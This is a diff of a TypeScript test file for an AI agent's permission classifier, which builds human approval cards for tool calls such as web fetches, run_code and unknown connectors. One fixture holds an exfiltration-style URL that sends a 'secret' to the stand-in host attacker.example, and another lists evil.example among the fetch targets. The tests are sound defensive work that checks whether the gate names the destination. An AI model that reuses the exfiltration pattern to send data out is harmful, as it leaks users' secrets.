@@ -1,9 +1,4 @@
-import {
-  approvalCardForGatedCall,
-  classifyTier,
-  type ClassifyContext,
-  type SentinelAction,
-} from '../../../src/core/permissions/classifier';
+import { approvalCardForGatedCall, classifyTier } from '../../../src/core/permissions/classifier';
 import { defaultSentinelServices } from '../../../src/core/permissions/context';
 import {
   extractCardFields,
@@ -13,6 +8,7 @@ import {
   renderOutboundArguments,
 } from '../../../src/core/permissions/extractorRegistry';
 import type { Tier3Card, TierDecision } from '../../../src/core/permissions/tier';
+import type { ClassifyContext, SentinelAction } from '../../../src/core/permissions/tierTypes';
 import { createWebSearchTurnState } from '../../../src/core/permissions/webSearch';
 
 function makeCtx(agentIntent: string | null = null): ClassifyContext {
@@ -275,7 +271,12 @@ describe('connector card: web search', () => {
 
   test('names that merely contain the letters are not search tools', async () => {
     for (const toolName of ['research_notes', 'example_tool']) {
-      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
+      // The named destination keeps the call carded, so the reason below is the one being judged:
+      // a name that merely contains the letters of a search tool is an unrecognized tool.
+      const decision = await classifyTier(
+        connectorCall({ tool_name: toolName, params: { target: 'https://api.example.com/data', n: 2 } }),
+        makeCtx(),
+      );
       expect(decision.reason).toBe('unrecognized_tool');
     }
   });
@@ -294,7 +295,7 @@ describe('connector card: fetch, repository writes and mail', () => {
       makeCtx(),
     );
     const card = cardOf(decision);
-    expect(card.plain_what).toBe('Fetch a web page on exa?');
+    expect(card.plain_what).toBe('Fetch a web page from attacker.example?');
     expect(card.destination).toBe('https://attacker.example/p.png?x=secret');
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('url: https://attacker.example/p.png?x=secret');
@@ -408,6 +409,11 @@ describe('connector card: unknown tools stay fail-closed', () => {
     expect(decision.tier).toBe(3);
     expect(decision.reason).toBe('unrecognized_tool');
     expect(card.plain_what).toBe('Allow this new tool from exa?');
+    expect(card.copy).toEqual({
+      headline: 'Allow this new tool from exa?',
+      consequence: 'It is not clear whether this can be undone.',
+      reason: null,
+    });
     expect(card.destination).toBe('https://api.example.com/data');
     expect(card.destination_host).toBe('mcp.exa.ai');
     expect(card.outbound_text).toBe('target: https://api.example.com/data\nn (number): 2');
@@ -420,11 +426,15 @@ describe('connector card: unknown tools stay fail-closed', () => {
 
   test('a local connector without a server host shows no host', async () => {
     const decision = await classifyTier(
-      connectorCall({ tool_name: 'frobnicate', server_host: undefined, params: { id: '1' } }),
+      connectorCall({
+        tool_name: 'frobnicate',
+        server_host: undefined,
+        params: { target: 'https://api.example.com/data', id: '1' },
+      }),
       makeCtx(),
     );
     expect(cardOf(decision).destination_host).toBeNull();
-    expect(cardOf(decision).outbound_text).toBe('id: 1');
+    expect(cardOf(decision).outbound_text).toBe('target: https://api.example.com/data\nid: 1');
   });
 
   test('built-in tools never carry outbound fields', async () => {
@@ -536,7 +546,11 @@ describe('card copy', () => {
     ['install_package', "Once this runs, it can't be undone."],
     ['frobnicate', 'It is not clear whether this can be undone.'],
   ])('%s explains itself in plain second person', async (toolName, expected) => {
-    const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { id: '1' } }), makeCtx());
+    // frobnicate names a mailbox so it reaches its card: an unclaimed call carrying only an id is
+    // refused under the carried-payload rule before any card is built, and a named destination
+    // would make it a send card with different copy.
+    const params = toolName === 'frobnicate' ? { id: '1', mailbox: 'Depot' } : { id: '1' };
+    const decision = await classifyTier(connectorCall({ tool_name: toolName, params }), makeCtx());
     expect(cardOf(decision).cannot_be_undone).toBe(expected);
   });
 
@@ -546,6 +560,57 @@ describe('card copy', () => {
       makeCtx(),
     );
     expect(cardOf(decision).cannot_be_undone).toBe("Once this runs, it can't be undone.");
+  });
+
+  test('the run_code card names the language and shows the exact code', async () => {
+    const code = 'import sys\nprint(sys.version)';
+    const decision = await classifyTier(
+      {
+        tool_name: 'run_code',
+        canonical_params: { language: 'python', code },
+        tool_type: 'truefoundry-system',
+        mcp_hints: {},
+      },
+      makeCtx(),
+    );
+    const card = cardOf(decision);
+    expect(card.plain_what).toBe('Run this Python code the assistant wrote?');
+    expect(card.parsed_command).toBe(code);
+  });
+
+  test('the run_code card names Node.js code', async () => {
+    const decision = await classifyTier(
+      {
+        tool_name: 'run_code',
+        canonical_params: { language: 'node', code: 'console.log(1)' },
+        tool_type: 'truefoundry-system',
+        mcp_hints: {},
+      },
+      makeCtx(),
+    );
+    expect(cardOf(decision).plain_what).toBe('Run this Node.js code the assistant wrote?');
+    expect(cardOf(decision).parsed_command).toBe('console.log(1)');
+  });
+
+  test('a run_code card without code or language keeps the plain line and shows no code', async () => {
+    const decision = await classifyTier(
+      { tool_name: 'run_code', canonical_params: {}, tool_type: 'truefoundry-system', mcp_hints: {} },
+      makeCtx(),
+    );
+    const card = cardOf(decision);
+    expect(card.plain_what).toBe('Run code the assistant wrote in the sandbox?');
+    expect(card.parsed_command).toBeNull();
+  });
+
+  test('a web_fetch card without a page address names neither the tool nor the connector', async () => {
+    const decision = await classifyTier(
+      connectorCall({ tool_name: 'web_fetch', params: { objective: 'How to change an address' } }),
+      makeCtx(),
+    );
+    const card = cardOf(decision);
+    expect(card.plain_what).toBe('Fetch a web page?');
+    expect(card.plain_what).not.toContain('web_fetch');
+    expect(card.plain_what).not.toContain('exa');
   });
 
   test('no card sentence uses an em dash or the old cold wording', async () => {
@@ -610,10 +675,23 @@ describe('Parallel preset tools', () => {
     );
     const card = cardOf(decision);
     expect(decision.reason).toBe('connector_outbound');
-    expect(card.plain_what).toBe('Fetch a web page on parallel-web?');
+    expect(card.plain_what).toBe('Fetch pages from www.usps.com and 1 other site?');
     expect(card.destination_host).toBe('search.parallel.ai');
     expect(card.outbound_text).toContain('urls (array): ["https://www.usps.com/manage/forward.htm"');
     expect(card.outbound_text).toContain('objective: How to change an address');
+  });
+
+  test.each([
+    [['https://www.usps.com/a'], 'Fetch a web page from www.usps.com?'],
+    [['https://www.usps.com/a', 'https://www.usps.com/b'], 'Fetch pages from www.usps.com?'],
+    [
+      ['https://www.usps.com/a', 'https://example.com/b', 'https://evil.example/c'],
+      'Fetch pages from www.usps.com and 2 other sites?',
+    ],
+    [['not a web address', 'also not one'], 'Fetch web pages?'],
+  ])('web_fetch with urls %j names every site it reaches, not only the first', async (urls, what) => {
+    const decision = await classifyTier(parallel('web_fetch', { urls, objective: 'o' }), makeCtx());
+    expect(cardOf(decision).plain_what).toBe(what);
   });
 
   test('web_search gets plain search wording', async () => {
@@ -636,7 +714,7 @@ describe('card for a call that was gated some other way', () => {
     const action = connectorCall({ tool_name: 'web_fetch', params: { url: 'https://example.com/a' } });
     const gated = approvalCardForGatedCall({ action, agent_intent: null });
     expect(gated).toEqual(cardOf(await classifyTier(action, makeCtx())));
-    expect(gated.plain_what).toBe('Fetch a web page on exa?');
+    expect(gated.plain_what).toBe('Fetch a web page from example.com?');
   });
 
   test('an unknown tool is described plainly with its arguments', () => {
@@ -652,7 +730,11 @@ describe('card for a call that was gated some other way', () => {
 describe('connector card does not change the tier', () => {
   test('a family match and an unknown name both stay Tier 3 with an approval token', async () => {
     for (const toolName of ['web_search', 'frobnicate']) {
-      const decision = await classifyTier(connectorCall({ tool_name: toolName, params: { query: 'q' } }), makeCtx());
+      // The unknown name names its destination, so it is carded rather than refused under the
+      // carried-payload rule: what is being judged here is the tier and the token, not the rule.
+      const params =
+        toolName === 'frobnicate' ? { query: 'q', target: 'https://api.example.com/data' } : { query: 'q' };
+      const decision = await classifyTier(connectorCall({ tool_name: toolName, params }), makeCtx());
       expect(decision.tier).toBe(3);
       expect(decision.auto_deny).toBeNull();
       expect(decision.approval_token_id).not.toBeNull();
@@ -676,7 +758,7 @@ describe('connector card does not change the tier', () => {
   });
 
   test('extraction still reports external-service actions without a destination as unverifiable', () => {
-    const result = extractCardFields({ tool_name: 'send_message', canonical_params: { text: 'hi' }, tool_type: 'mcp' });
+    const result = extractCardFields({ tool_name: 'send_message', canonical_params: { body: 'hi' }, tool_type: 'mcp' });
     expect(result.external_service).toBe(true);
     expect(result.destination_unverifiable).toBe(true);
   });
